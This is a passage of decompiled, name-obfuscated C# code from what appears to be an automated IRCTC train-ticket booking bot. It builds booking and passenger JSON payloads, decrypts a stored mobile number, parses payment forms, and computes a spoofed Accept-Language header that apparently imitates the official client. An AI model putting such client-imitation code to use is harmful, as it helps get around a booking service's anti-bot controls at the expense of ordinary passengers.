		return text4.Substring(0, 8);
	}

	internal string method_7(string string_87)
	{
		string text = "";
		try
		{
			string value = "header";
			if (string_87.Contains(value))
			{
				string string_88 = "header";
				text = method_13(string_87, string_88);
				if (text == "")
				{
					string value2 = "header";
					text = string_87.Substring(string_87.IndexOf(value2) + 11);
					string text2 = text;
					string text3 = text;
					string value3 = "\",";
					text = text2.Substring(0, text3.IndexOf(value3));
				}
				string text4 = text;
				if (!(text != ""))
				{
					text = "";
					return text;
				}
				string text5 = method_3(text);
				string text6 = "#";
				text = text4 + text6 + text5;
				text = text5;
				return text;
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	internal string GetPassengerPOST(string string_87, string string_88, string resp, string hash, bool isRajdhani)
	{
		string value = "header";
		if (resp.IndexOf(value) > 0)
		{
			method_7(resp);
		}
		string text = string_15;
		string text2 = "9000000000";
		if (text == text2)
		{
			string text3 = "USR_DES-";
			string key = (text3 + hash).Substring(0, 16);
			string validate_Response = Validate_Response;
			string validate_Response2 = Validate_Response;
			string value2 = "mobile\":";
			string text4 = validate_Response.Substring(validate_Response2.IndexOf(value2) + 9);
			string value3 = "\"";
			string_15 = text4.Substring(0, text4.IndexOf(value3));
			string_15 = clsMain.Decrypt(key, string_15);
		}
		string text5 = "";
		string text6 = "3";
		string text7 = text6;
		string value4 = "PHONEPE";
		bool flag = string_88.Contains(value4);
		string value5 = "SBIUPI";
		bool flag2 = flag | string_88.Contains(value5);
		string value6 = "BHIM";
		bool flag3 = flag2 | string_88.Contains(value6);
		string value7 = "FREECHARGE";
		bool flag4 = flag3 | string_88.Contains(value7);
		string value8 = "NPCI";
		bool flag5 = flag4 | string_88.Contains(value8);
		string value9 = "iPay-QR";
		bool flag6 = flag5 | string_88.Contains(value9);
		string value10 = "QR";
		if (flag6 | string_88.Contains(value10))
		{
			string text8 = "2";
			text7 = text8;
		}
		string value11 = "foodChoiceEnabled\":\"true";
		bool flag7 = resp.Contains(value11);
		string tRAIN_NO = TRAIN_NO;
		string text9 = "12302";
		bool flag8 = tRAIN_NO == text9;
		string tRAIN_NO2 = TRAIN_NO;
		string text10 = "12301";
		if (flag8 | (tRAIN_NO2 == text10))
		{
			flag7 = true;
		}
		string value12 = "bedRollFlagEnabled\":\"true";
		bool bool_ = resp.Contains(value12);
		string tKT_QUOTA = TKT_QUOTA;
		string text11 = "CK";
		int num;
		if (!(tKT_QUOTA == text11))
		{
			string tKT_QUOTA2 = TKT_QUOTA;
			string text12 = "PT";
			if (!(tKT_QUOTA2 == text12))
			{
				string tKT_QUOTA3 = TKT_QUOTA;
				string text13 = "TQ";
				num = ((tKT_QUOTA3 == text13) ? 1 : 0);
				goto IL_022d;
			}
		}
		num = 1;
		goto IL_022d;
		IL_022d:
		bool bool_2 = (byte)num != 0;
		string value13 = "forgoConcession\":\"true";
		bool bool_3 = resp.Contains(value13);
		string text14 = "99";
		string text15 = text14;
		string text16 = "false";
		string text17 = text16;
		string text18 = "true";
		string text19 = text18;
		if (!TKT_ISCONFIRM)
		{
			if (bool_6)
			{
				string text20 = "1";
				text15 = text20;
			}
		}
		else
		{
			string text21 = "4";
			text15 = text21;
			string text22 = "true";
			text17 = text22;
			string text23 = "false";
			text19 = text23;
		}
		object[] array = new object[5];
		string[] array2 = new string[33];
		string text24 = "{\"clusterFlag\":\"N\",\"onwardFlag\":\"N\",\"cod\":\"false\",\"reservationMode\":\"WS_TA_B2C\",\"autoUpgradationSelected\":false,\"gnToCkOpted\":false,\"paymentType\":\"";
		array2[0] = text24;
		array2[1] = text7;
		string text25 = "\",\"twoPhaseAuthRequired\":false,\"captureAddress\":0,\"wsUserLogin\":\"";
		array2[2] = text25;
		array2[3] = IRCTC_ID;
		string text26 = "\",\"moreThanOneDay\":false,\"clientTransactionId\":\"";
		array2[4] = text26;
		array2[5] = string_87;
		string text27 = "\",\"boardingStation\":\"";
		array2[6] = text27;
		array2[7] = BRD_STN;
		string text28 = "\",\"reservationUptoStation\":\"";
		array2[8] = text28;
		array2[9] = DEST_STN;
		string text29 = "\",\"mobileNumber\":\"";
		array2[10] = text29;
		array2[11] = string_15;
		string text30 = "\",\"ticketType\":\"E\",\"mainJourneyTxnId\":null,\"mainJourneyPnr\":\"\",\"captcha\":\"\",\"generalistChildConfirm\":false,\"ftBooking\":false,\"loyaltyRedemptionBooking\":false,\"loyaltyBankId\":null,\"loyaltyNumber\":null,\"nosbBooking\":false,\"warrentType\":0,\"ftTnCAgree\":false,\"bookingChoice\":1,\"bookingConfirmChoice\":1,\"bookOnlyIfCnf\":";
		array2[12] = text30;
		array2[13] = text17;
		string text31 = ",\"returnJourney\":false,\"connectingJourney\":false,\"lapAvlRequestDTO\":[{\"trainNo\":\"";
		array2[14] = text31;
		array2[15] = TRAIN_NO;
		string text32 = "\",\"journeyDate\":\"";
		array2[16] = text32;
		ref DateTime reference = ref dateTime_0;
		string text33 = "yyyMMdd";
		array2[17] = reference.ToString(text33);
		string text34 = "\",\"fromStation\":\"";
		array2[18] = text34;
		array2[19] = SRC_STN;
		string text35 = "\",\"toStation\":\"";
		array2[20] = text35;
		array2[21] = DEST_STN;
		string text36 = "\",\"journeyClass\":\"";
		array2[22] = text36;
		array2[23] = TKT_CLASS;
		string text37 = "\",\"quota\":\"";
		array2[24] = text37;
		array2[25] = TKT_QUOTA;
		string text38 = "\",\"coachId\":null,\"reservationChoice\":";
		array2[26] = text38;
		array2[27] = text15;
		string text39 = ",\"ignoreChoiceIfWl\":";
		array2[28] = text39;
		array2[29] = text19;
		string text40 = ",\"travelInsuranceOpted\":\"false\",\"warrentType\":0,\"coachPreferred\":false,\"autoUpgradation\":false,\"bookOnlyIfCnf\":";
		array2[30] = text40;
		array2[31] = text17;
		string text41 = ",\"addMealInput\":null,\"concessionBooking\":false,\"passengerList\":[";
		array2[32] = text41;
		array[0] = string.Concat(array2);
		string text42 = "";
		object[] array3 = array;
		int num2 = 1;
		foreach (Class21 item in list_0)
		{
			text42 = text42 + item.string_0 + item.string_1;
			text5 += item.method_3(num2, bool_2, flag7, bool_, TKT_QUOTA, bool_3);
			num2++;
			int_4++;
			if (list_0.Count >= num2)
			{
				string text43 = text5;
				string text44 = ",";
				text5 = text43 + text44;
			}
		}
		string[] array4 = new string[2] { text5, null };
		string text45 = "],\"ssQuotaSplitCoach\":\"N\"}],\"gstDetails\":{\"gstIn\":\"\",\"error\":null}}";
		array4[1] = text45;
		array3[2] = string.Concat(array4);
		if (!string.IsNullOrEmpty(TKT_COACH) && TKT_COACH.Length == 3)
		{
			string prompt = "Please Enter Coach ID";
			string title = "Coach ID";
			TKT_COACH = Interaction.InputBox(prompt, title, TKT_COACH);
		}
		string text46 = "en-US,en;q=0.";
		Accept_Language = text46 + CustomCharCount(text42);
		return string.Concat(array3);
	}

	internal string GetPassengerPOST_New(string string_87, string string_88, string resp, string hash, bool isRajdhani)
	{
		string value = "header";
		if (resp.IndexOf(value) > 0)
		{
			method_7(resp);
		}
		string text = string_15;
		string text2 = "9000000000";
		if (text == text2)
		{
			string text3 = "USR_DES-";
			string key = (text3 + hash).Substring(0, 16);
			string validate_Response = Validate_Response;
			string validate_Response2 = Validate_Response;
			string value2 = "mobile\":";
			string text4 = validate_Response.Substring(validate_Response2.IndexOf(value2) + 9);
			string value3 = "\"";
			string_15 = text4.Substring(0, text4.IndexOf(value3));
			string_15 = clsMain.Decrypt(key, string_15);
		}
		string text5 = "";
		string text6 = "3";
		string text7 = text6;
		string value4 = "PHONEPE";
		bool flag = string_88.Contains(value4);
		string value5 = "SBIUPI";
		bool flag2 = flag | string_88.Contains(value5);
		string value6 = "BHIM";
		bool flag3 = flag2 | string_88.Contains(value6);
		string value7 = "FREECHARGE";
		bool flag4 = flag3 | string_88.Contains(value7);
		string value8 = "NPCI";
		bool flag5 = flag4 | string_88.Contains(value8);
		string value9 = "iPay-QR";
		bool flag6 = flag5 | string_88.Contains(value9);
		string value10 = "PayTM-QR";
		if (flag6 | string_88.Contains(value10))
		{
			string text8 = "2";
			text7 = text8;
		}
		string value11 = "foodChoiceEnabled\":\"true";
		bool flag7 = resp.Contains(value11);
		string tRAIN_NO = TRAIN_NO;
		string text9 = "12302";
		bool flag8 = tRAIN_NO == text9;
		string tRAIN_NO2 = TRAIN_NO;
		string text10 = "12301";
		if (flag8 | (tRAIN_NO2 == text10))
		{
			flag7 = true;
		}
		string value12 = "bedRollFlagEnabled\":\"true";
		bool bool_ = resp.Contains(value12);
		string tKT_QUOTA = TKT_QUOTA;
		string text11 = "CK";
		int num;
		if (!(tKT_QUOTA == text11))
		{
			string tKT_QUOTA2 = TKT_QUOTA;
			string text12 = "PT";
			if (!(tKT_QUOTA2 == text12))
			{
				string tKT_QUOTA3 = TKT_QUOTA;
				string text13 = "TQ";
				num = ((tKT_QUOTA3 == text13) ? 1 : 0);
				goto IL_022d;
			}
		}
		num = 1;
		goto IL_022d;
		IL_022d:
		bool bool_2 = (byte)num != 0;
		string value13 = "forgoConcession\":\"true";
		bool bool_3 = resp.Contains(value13);
		string text14 = "99";
		string text15 = text14;
		string text16 = "false";
		string text17 = text16;
		string text18 = "true";
		string text19 = text18;
		if (TKT_ISCONFIRM & !Status_WL)
		{
			string text20 = "4";
			text15 = text20;
			string text21 = "true";
			text17 = text21;
			string text22 = "false";
			text19 = text22;
		}
		else if (bool_6)
		{
			string text23 = "1";
			text15 = text23;
		}
		object[] array = new object[5];
		string[] array2 = new string[31];
		string text24 = "{\"clusterFlag\":\"N\",\"onwardFlag\":\"N\",\"cod\":\"false\",\"reservationMode\":\"WS_TA_B2C\",\"autoUpgradationSelected\":false,\"gnToCkOpted\":false,\"paymentType\":\"";
		array2[0] = text24;
		array2[1] = text7;
		string text25 = "\",\"twoPhaseAuthRequired\":false,\"captureAddress\":0,\"wsUserLogin\":\"";
		array2[2] = text25;
		array2[3] = IRCTC_ID;
		string text26 = "\",\"moreThanOneDay\":false,\"clientTransactionId\":\"";
		array2[4] = text26;
		array2[5] = string_87;
		string text27 = "\",\"boardingStation\":\"";
		array2[6] = text27;
		array2[7] = BRD_STN;
		string text28 = "\",\"reservationUptoStation\":\"";
		array2[8] = text28;
		array2[9] = DEST_STN;
		string text29 = "\",\"mobileNumber\":\"";
		array2[10] = text29;
		array2[11] = string_15;
		string text30 = "\",\"ticketType\":\"E\",\"mainJourneyTxnId\":null,\"mainJourneyPnr\":\"\",\"captcha\":\"\",\"generalistChildConfirm\":false,\"ftBooking\":false,\"loyaltyRedemptionBooking\":false,\"loyaltyBankId\":null,\"loyaltyNumber\":null,\"nosbBooking\":false,\"warrentType\":0,\"ftTnCAgree\":false,\"bookingChoice\":0,\"bookingConfirmChoice\":0,\"bookOnlyIfCnf\":true,\"returnJourney\":false,\"connectingJourney\":false,\"lapAvlRequestDTO\":[{\"trainNo\":\"";
		array2[12] = text30;
		array2[13] = TRAIN_NO;
		string text31 = "\",\"journeyDate\":\"";
		array2[14] = text31;
		ref DateTime reference = ref dateTime_0;
		string text32 = "yyyMMdd";
		array2[15] = reference.ToString(text32);
		string text33 = "\",\"fromStation\":\"";
		array2[16] = text33;
		array2[17] = SRC_STN;
		string text34 = "\",\"toStation\":\"";
		array2[18] = text34;
		array2[19] = DEST_STN;
		string text35 = "\",\"journeyClass\":\"";
		array2[20] = text35;
		array2[21] = TKT_CLASS;
		string text36 = "\",\"quota\":\"";
		array2[22] = text36;
		array2[23] = TKT_QUOTA;
		string text37 = "\",\"coachId\":null,\"reservationChoice\":";
		array2[24] = text37;
		array2[25] = text15;
		string text38 = ",\"ignoreChoiceIfWl\":";
		array2[26] = text38;
		array2[27] = text19;
		string text39 = ",\"travelInsuranceOpted\":\"false\",\"warrentType\":0,\"coachPreferred\":false,\"autoUpgradation\":false,\"bookOnlyIfCnf\":";
		array2[28] = text39;
		array2[29] = text17;
		string text40 = ",\"addMealInput\":null,\"concessionBooking\":false,\"passengerList\":[";
		array2[30] = text40;
		array[0] = string.Concat(array2);
		string text41 = "";
		object[] array3 = array;
		int num2 = 1;
		foreach (Class21 item in list_0)
		{
			text41 = text41 + item.string_0 + item.string_1;
			text5 += item.method_3(num2, bool_2, flag7, bool_, TKT_QUOTA, bool_3);
			num2++;
			int_4++;
			if (list_0.Count >= num2)
			{
				string text42 = text5;
				string text43 = ",";
				text5 = text42 + text43;
			}
		}
		string[] array4 = new string[2] { text5, null };
		string text44 = "],\"ssQuotaSplitCoach\":\"N\"}],\"gstDetails\":{\"gstIn\":\"\",\"error\":null}}";
		array4[1] = text44;
		array3[2] = string.Concat(array4);
		if (!string.IsNullOrEmpty(TKT_COACH) && TKT_COACH.Length == 3)
		{
			string prompt = "Please Enter Coach ID";
			string title = "Coach ID";
			TKT_COACH = Interaction.InputBox(prompt, title, TKT_COACH);
		}
		string text45 = "en-US,en;q=0.";
		Accept_Language = text45 + CustomCharCount(text41);
		return string.Concat(array3);
	}

	internal string GetPassengerPOST_App_OLD(string string_87, string string_88, string resp, string hash, string mobileBase64, bool isRajdhani)
	{
		object[] array = new object[5];
		try
		{
			string value = "header";
			if (resp.IndexOf(value) > 0)
			{
				method_7(resp);
			}
			string text = "";
			string text2 = "3";
			string text3 = text2;
			string value2 = "PHONEPE";
			bool flag = string_88.Contains(value2);
			string value3 = "BHIM";
			bool flag2 = flag | string_88.Contains(value3);
			string value4 = "FREECHARGE";
			bool flag3 = flag2 | string_88.Contains(value4);
			string value5 = "NPCI";
			if (flag3 | string_88.Contains(value5))
			{
				string text4 = "2";
				text3 = text4;
			}
			string value6 = "foodChoiceEnabled\":\"true";
			bool flag4 = resp.Contains(value6);
			string tRAIN_NO = TRAIN_NO;
			string text5 = "12302";
			bool flag5 = tRAIN_NO == text5;
			string tRAIN_NO2 = TRAIN_NO;
			string text6 = "12301";
			if (flag5 | (tRAIN_NO2 == text6))
			{
				flag4 = true;
			}
			string value7 = "bedRollFlagEnabled\":\"true";
			bool bool_ = resp.Contains(value7);
			string tKT_QUOTA = TKT_QUOTA;
			string text7 = "CK";
			int num;
			if (!(tKT_QUOTA == text7))
			{
				string tKT_QUOTA2 = TKT_QUOTA;
				string text8 = "PT";
				if (!(tKT_QUOTA2 == text8))
				{
					string tKT_QUOTA3 = TKT_QUOTA;
					string text9 = "TQ";
					num = ((tKT_QUOTA3 == text9) ? 1 : 0);
					goto IL_0164;
				}
			}
			num = 1;
			goto IL_0164;
			IL_0164:
			bool bool_2 = (byte)num != 0;
			string value8 = "forgoConcession\":\"true";
			bool bool_3 = resp.Contains(value8);
			string text10 = "99";
			string text11 = text10;
			string text12 = "false";
			string text13 = text12;
			string text14 = "true";
			string text15 = text14;
			if (TKT_ISCONFIRM)
			{
				string text16 = "4";
				text11 = text16;
				string text17 = "true";
				text13 = text17;
				string text18 = "false";
				text15 = text18;
			}
			else if (bool_6)
			{
				string text19 = "1";
				text11 = text19;
			}
			string[] array2 = new string[19];
			string text20 = "{\"wsUserLogin\":\"";
			array2[0] = text20;
			array2[1] = IRCTC_ID;
			string text21 = "\",\"warrentType\":0,\"moreThanOneDay\":false,\"autoUpgradation\":true,\"mainJourneyPnr\":\"\",\"tktAddress\":{\"country\":\"\",\"phoneNumber\":0,\"phoneExt\":0,\"postOffice\":\"\",\"stateName\":\"\",\"pinCode\":0,\"colony\":\"\",\"validRegdAddress\":false,\"address\":\"\",\"addressFlag\":0,\"street\":\"\",\"city\":\"\"},\"bookingConfirmChoice\":0,\"gnToCkOpted\":false,\"connectingJourney\":false,\"nosbBooking\":false,\"ftBooking\":false,\"reservationMode\":\"WS_TA_B2C\",\"autoUpgradationSelected\":false,\"boardingStation\":\"";
			array2[2] = text21;
			array2[3] = BRD_STN;
			string text22 = "\",\"paymentType\":";
			array2[4] = text22;
			array2[5] = text3;
			string text23 = ",\"bookingChoice\":0,\"gstDetails\":{\"gstIn\":\"\"},\"returnJourney\":false,\"reservationUptoStation\":\"";
			array2[6] = text23;
			array2[7] = DEST_STN;
			string text24 = "\",\"clusterFlag\":\"N\",\"cod\":\"false\",\"onwardFlag\":\"N\",\"lapAvlRequestDTO\":[{\"fromStation\":\"";
			array2[8] = text24;
			array2[9] = SRC_STN;
			string text25 = "\",\"bookOnlyIfCnf\":";
			array2[10] = text25;
			array2[11] = text13;
			string text26 = ",\"trainNo\":\"";
			array2[12] = text26;
			array2[13] = TRAIN_NO;
			string text27 = "\",\"travelInsuranceOpted\":false,\"ignoreChoiceIfWl\":";
			array2[14] = text27;
			array2[15] = text15;
			string text28 = ",\"journeyDate\":\"";
			array2[16] = text28;
			ref DateTime reference = ref dateTime_0;
			string text29 = "yyyMMdd";
			array2[17] = reference.ToString(text29);
			string text30 = "\",\"coachPreferred\":false,\"passengerList\":[";
			array2[18] = text30;
			array[0] = string.Concat(array2);
			string[] array3 = new string[11];
			string text31 = "{\"masterId\":null,\"wsUserLogin\":\"";
			array3[0] = text31;
			array3[1] = IRCTC_ID;
			string text32 = "\",\"wsUserPassword\":null,\"wsUserTransactionPassword\":null,\"agentDeviceId\":null,\"alternateAvlInputDTO\":null,\"atasOpted\":null,\"autoUpgradationSelected\":false,\"bankId\":0,\"boardingStation\":null,\"bookNowPressTimeDiff\":0,\"bookingChoice\":0,\"bookingConfirmChoice\":0,\"bookingInitTime\":0,\"bookingOTP\":null,\"captcha\":null,\"captureAddress\":0,\"clientTransactionId\":\"";
			array3[2] = text32;
			array3[3] = string_87;
			string text33 = "\",\"clusterFlag\":\"N\",\"clusterJourneyClass\":null,\"cod\":\"false\",\"connectedPnrDataDTO\":null,\"connectingJourney\":false,\"covid19\":false,\"enrouteStation\":null,\"ftBooking\":false,\"generalistChildConfirm\":false,\"gnToCkOpted\":false,\"gstDetails\":null,\"hrmsTxnId\":0,\"iTicketDetailsDTO\":null,\"journalistBooking\":false,\"lapAvlRequestDTO\":[{\"addMealDetail\":null,\"agentOtpBooking\":false,\"coachId\":null,\"concessionBooking\":false,\"fromStation\":\"";
			array3[4] = text33;
			array3[5] = SRC_STN;
			string text34 = "\",\"ignoreChoiceIfWl\":true,\"infantList\":[],\"jd\":null,\"journeyClass\":\"";
			array3[6] = text34;
			array3[7] = TKT_CLASS;
			string text35 = "\",\"journeyDate\":\"";
			array3[8] = text35;
			ref DateTime reference2 = ref dateTime_0;
			string text36 = "yyyMMdd";
			array3[9] = reference2.ToString(text36);
			string text37 = "\",\"passengerList\":[";
			array3[10] = text37;
			array[0] = string.Concat(array3);
			int num2 = 1;
			foreach (Class21 item in list_0)
			{
				text += item.method_31_app(num2, bool_2, flag4, bool_, TKT_QUOTA, bool_3);
				num2++;
				int_4++;
				if (list_0.Count >= num2)
				{
					string text38 = text;
					string text39 = ",";
					text = text38 + text39;
				}
			}
			string[] array4 = new string[14]
			{
				text, null, null, null, null, null, null, null, null, null,
				null, null, null, null
			};
			string text40 = "],\"ticketChoiceSameCoach\":false,\"coachId\":\"\",\"toStation\":\"";
			array4[1] = text40;
			array4[2] = DEST_STN;
			string text41 = "\",\"autoUpgradation\":true,\"reservationChoice\":";
			array4[3] = text41;
			array4[4] = text11;
			string text42 = ",\"journeyClass\":\"";
			array4[5] = text42;
			array4[6] = TKT_CLASS;
			string text43 = "\",\"quota\":\"";
			array4[7] = text43;
			array4[8] = DEST_STN;
			string text44 = "\",\"addMealDetail\":[]}],\"clientTransactionId\":\"";
			array4[9] = text44;
			array4[10] = string_87;
			string text45 = "\",\"ticketType\":\"E\",\"mobileNumber\":\"";
			array4[11] = text45;
			array4[12] = string_15;
			string text46 = "\",\"bookingInitTime\":0,\"bookNowPressTimeDiff\":0,\"generalistChildConfirm\":false,\"loyaltyRedemptionBooking\":false}";
			array4[13] = text46;
			array[1] = string.Concat(array4);
			string[] array5 = new string[10] { text, null, null, null, null, null, null, null, null, null };
			string text47 = "],\"quota\":\"";
			array5[1] = text47;
			array5[2] = TKT_QUOTA;
			string text48 = "\",\"reservationChoice\":99,\"ssQuotaSplitCoach\":\"N\",\"ticketChoiceLowerBerth\":null,\"ticketChoiceSameCoach\":false,\"toStation\":\"";
			array5[3] = text48;
			array5[4] = DEST_STN;
			string text49 = "\",\"trainNo\":\"";
			array5[5] = text49;
			array5[6] = TRAIN_NO;
			string text50 = "\",\"trainOwner\":null,\"travelInsuranceOpted\":null}],\"loyaltyAccuralBooking\":false,\"loyaltyBankId\":null,\"loyaltyNumber\":null,\"loyaltyRedemptionBooking\":false,\"mainJourneyPnr\":null,\"mainJourneyTktId\":null,\"mainJourneyTxnId\":null,\"mobileNumber\":\"";
			array5[7] = text50;
			array5[8] = string_15;
			string text51 = "\",\"moreThanOneDay\":false,\"mpBooking\":false,\"mpSecType\":null,\"name\":null,\"nget_transaction_id\":0,\"nosbBooking\":false,\"onwardFlag\":\"N\",\"otpBooking\":false,\"passBooking\":false,\"paymentType\":2,\"reservationMode\":\"WS_TA_B2C\",\"reservationUptoStation\":null,\"returnJourney\":false,\"ticketConcessionType\":0,\"ticketType\":\"E\",\"tktAddress\":null,\"twoPhaseAuthRequired\":false,\"viaPointStation\":null,\"warrentType\":null}";
			array5[9] = text51;
			array[1] = string.Concat(array5);
		}
		catch (Exception)
		{
		}
		return string.Concat(array);
	}

	internal string GetPassengerPOST_App(string clientTxnId, string paymentName, string resp, string hash, string mobileBase64, bool isRajdhani)
	{
		try
		{
			if (resp.Contains("header"))
			{
				method_7(resp);
			}
			string text = "3";
			if (paymentName.Contains("PHONEPE") || paymentName.Contains("BHIM") || paymentName.Contains("FREECHARGE") || paymentName.Contains("NPCI"))
			{
				text = "2";
			}
			bool flag = resp.Contains("foodChoiceEnabled\":\"true");
			if (TRAIN_NO == "12302" || TRAIN_NO == "12301")
			{
				flag = true;
			}
			bool bool_ = resp.Contains("bedRollFlagEnabled\":\"true");
			bool bool_2 = TKT_QUOTA == "CK" || TKT_QUOTA == "PT" || TKT_QUOTA == "TQ";
			bool bool_3 = resp.Contains("forgoConcession\":\"true");
			string text2 = "99";
			bool flag2 = false;
			bool flag3 = true;
			if (TKT_ISCONFIRM)
			{
				text2 = "4";
				flag2 = true;
				flag3 = false;
			}
			else if (bool_6)
			{
				text2 = "1";
			}
			StringBuilder stringBuilder = new StringBuilder();
			int num = 1;
			foreach (Class21 item in list_0)
			{
				stringBuilder.Append(item.method_31_app(num, bool_2, flag, bool_, TKT_QUOTA, bool_3));
				num++;
				int_4++;
				if (list_0.Count >= num)
				{
					stringBuilder.Append(",");
				}
			}
			string text3 = stringBuilder.ToString();
			return "{\"masterId\":null,\"wsUserLogin\":\"" + IRCTC_ID + "\",\"wsUserPassword\":null,\"wsUserTransactionPassword\":null,\"agentDeviceId\":null,\"alternateAvlInputDTO\":null,\"atasOpted\":null,\"autoUpgradationSelected\":false,\"bankId\":0,\"boardingStation\":\"" + BRD_STN + "\",\"bookNowPressTimeDiff\":0,\"bookingChoice\":0,\"bookingConfirmChoice\":0,\"bookingInitTime\":0,\"bookingOTP\":null,\"captcha\":null,\"captureAddress\":0,\"clientTransactionId\":\"" + clientTxnId + "\",\"clusterFlag\":\"N\",\"cod\":false,\"connectingJourney\":false,\"covid19\":false,\"ftBooking\":false,\"generalistChildConfirm\":false,\"gnToCkOpted\":false,\"journalistBooking\":false,\"lapAvlRequestDTO\":[{\"fromStation\":\"" + SRC_STN + "\",\"ignoreChoiceIfWl\":" + flag3.ToString().ToLower() + ",\"infantList\":[],\"journeyClass\":\"" + TKT_CLASS + "\",\"journeyDate\":\"" + dateTime_0.ToString("yyyyMMdd") + "\",\"passengerList\":[" + text3 + "],\"quota\":\"" + TKT_QUOTA + "\",\"reservationChoice\":" + text2 + ",\"ticketChoiceSameCoach\":false,\"toStation\":\"" + DEST_STN + "\",\"trainNo\":\"" + TRAIN_NO + "\",\"travelInsuranceOpted\":false,\"bookOnlyIfCnf\":" + flag2.ToString().ToLower() + ",\"addMealDetail\":[]}],\"loyaltyAccuralBooking\":false,\"loyaltyRedemptionBooking\":false,\"mainJourneyPnr\":null,\"mobileNumber\":\"" + string_15 + "\",\"moreThanOneDay\":false,\"mpBooking\":false,\"nosbBooking\":false,\"onwardFlag\":\"N\",\"otpBooking\":false,\"passBooking\":false,\"paymentType\":" + text + ",\"reservationMode\":\"WS_TA_B2C\",\"reservationUptoStation\":\"" + DEST_STN + "\",\"returnJourney\":false,\"ticketConcessionType\":0,\"ticketType\":\"E\",\"twoPhaseAuthRequired\":false,\"warrentType\":0}";
		}
		catch (Exception ex)
		{
			return ex.ToString();
		}
	}

	public int CustomCharCount(string input)
	{
		int num = 0;
		foreach (char c in input)
		{
			num = ((char.IsLower(c) || char.IsDigit(c)) ? (num + 1) : (num + 2));
		}
		return num;
	}

	public List<string> method_11(string string_87)
	{
		string[] array = new string[2];
		string text = "{";
		array[0] = text;
		string text2 = "},";
		array[1] = text2;
		List<string> list = new List<string>(string_87.Split(array, StringSplitOptions.None));
		list.RemoveAll(smethod_3);
		if (predicate_0 == null)
		{
			predicate_0 = smethod_0;
		}
		list.RemoveAll(predicate_0);
		if (predicate_1 == null)
		{
			predicate_1 = smethod_1;
		}
		if (predicate_2 == null)
		{
			predicate_2 = smethod_2;
		}
		list.RemoveAll(predicate_2);
		return list;
	}

	private static bool smethod_0(string string_87)
	{
		if (string_87.ToLower().Contains(""))
		{
			return !string_87.ToLower().Contains("");
		}
		return true;
	}

	private static bool smethod_1(string string_87)
	{
		string value = "\"";
		return !string_87.EndsWith(value);
	}

	private static bool smethod_2(string string_87)
	{
		string text = "</td>";
		return string_87 == text;
	}

	private static bool smethod_3(string string_87)
	{
		return string_87 == "";
	}

	public static string smethod_4(string string_87, ref string string_88)
	{
		string text = "";
		try
		{
			string oldValue = "'";
			string newValue = "\"";
			string text2 = string_87.Replace(oldValue, newValue);
			string value = "<form";
			int num = text2.IndexOf(value, StringComparison.CurrentCultureIgnoreCase);
			if (num < 0)
			{
				string value2 = "http://";
				if (text2.IndexOf(value2) != 0)
				{
					string value3 = "https://";
					if (text2.IndexOf(value3) != 0)
					{
						goto IL_04f1;
					}
				}
				string_88 = text2;
				goto IL_04f1;
			}
			try
			{
				string value4 = " action";
				int startIndex = text2.IndexOf(value4, num, StringComparison.CurrentCultureIgnoreCase);
				string value5 = "=";
				startIndex = text2.IndexOf(value5, startIndex, StringComparison.CurrentCultureIgnoreCase);
				string value6 = "\"";
				startIndex = text2.IndexOf(value6, startIndex) + 1;
				string value7 = "\"";
				int num2 = text2.IndexOf(value7, startIndex);
				string_88 = text2.Substring(startIndex, num2 - startIndex);
				string text3 = string_88;
				string oldValue2 = "&amp;";
				string newValue2 = "&";
				string_88 = text3.Replace(oldValue2, newValue2);
			}
			catch
			{
			}
			string value8 = "<form";
			num = text2.IndexOf(value8, StringComparison.CurrentCultureIgnoreCase);
			string value9 = "</form";
			int num3 = text2.IndexOf(value9, StringComparison.CurrentCultureIgnoreCase);
			while (true)
			{
				if (num > -1)
				{
					string text4 = "";
					string value10 = "<input";
					int num4 = text2.IndexOf(value10, num, StringComparison.CurrentCultureIgnoreCase);
					string value11 = "<select";
					int num5 = text2.IndexOf(value11, num, StringComparison.CurrentCultureIgnoreCase);
					int num6 = -1;
					if (num4 == -1 && num5 == -1 && num6 == -1)
					{
						break;
					}
					int num7 = num4;
					int[] array = new int[3] { num4, num5, num6 };
					for (int i = 1; i < array.Length; i++)
					{
						if (num7 > array[i] && array[i] != -1)
						{
							num7 = array[i];
						}
					}
					if (num7 != num4)
					{
						if (num7 == num5)
						{
							num = num5;
							string text5 = "select";
							text4 = text5;
						}
						else if (num7 == num6)
						{
							num = num6;
							text4 = "";
						}
					}
					else
					{
						num = num4;
						string text6 = "input";
						text4 = text6;
					}
					string text7 = "<";
					num = text2.IndexOf(text7 + text4, num, StringComparison.CurrentCultureIgnoreCase);
					if (num < num3)
					{
						string value12 = "<input";
						num = text2.IndexOf(value12, num, StringComparison.CurrentCultureIgnoreCase);
						string value13 = ">";
						int num8 = text2.IndexOf(value13, num) + 1;
						string text8 = text2.Substring(num, num8 - num);
						string text9 = text8;
						string oldValue3 = "\t";
						string text10 = text9.Replace(oldValue3, "");
						string oldValue4 = "\n";
						string text11 = text10.Replace(oldValue4, "");
						string oldValue5 = "\r";
						string newValue3 = " ";
						text8 = text11.Replace(oldValue5, newValue3);
						num = num8;
						string text12 = text8;
						string value14 = "type=\"submit\"";
						if (text12.Contains(value14))
						{
							continue;
						}
						string text13 = text8;
						string value15 = " name";
						int num9 = text13.IndexOf(value15, StringComparison.CurrentCultureIgnoreCase);
						if (num9 == -1)
						{
							continue;
						}
						string text14 = text8;
						string value16 = "\"";
						num9 = text14.IndexOf(value16, num9) + 1;
						string text15 = text8;
						string value17 = "\"";
						int num10 = text15.IndexOf(value17, num9);
						string text16 = text8.Substring(num9, num10 - num9);
						string text17 = text8;
						string value18 = " value";
						num9 = text17.IndexOf(value18, StringComparison.CurrentCultureIgnoreCase);
						string text18 = "";
						if (num9 > -1)
						{
							string text19 = text8;
							string value19 = "\"";
							if (text19.IndexOf(value19, num9) <= -1)
							{
								string text20 = text8;
								string value20 = "'";
								if (text20.IndexOf(value20, num9) > -1)
								{
									string text21 = text8;
									string value21 = "'";
									num9 = text21.IndexOf(value21, num9) + 1;
									string text22 = text8;
									string value22 = "'";
									num10 = text22.IndexOf(value22, num9);
								}
							}
							else
							{
								string text23 = text8;
								string value23 = "\"";
								num9 = text23.IndexOf(value23, num9) + 1;
								string text24 = text8;
								string value24 = "\"";
								num10 = text24.IndexOf(value24, num9);
							}
							string text25 = text8.Substring(num9, num10 - num9);
							string oldValue6 = "&amp;";
							string newValue4 = "&";
							text18 = HttpUtility.UrlEncode(text25.Replace(oldValue6, newValue4));
						}
						string text26 = text16;
						string text27 = "=";
						text16 = text26 + text27 + text18;
						string text30;
						if (!string.IsNullOrEmpty(text))
						{
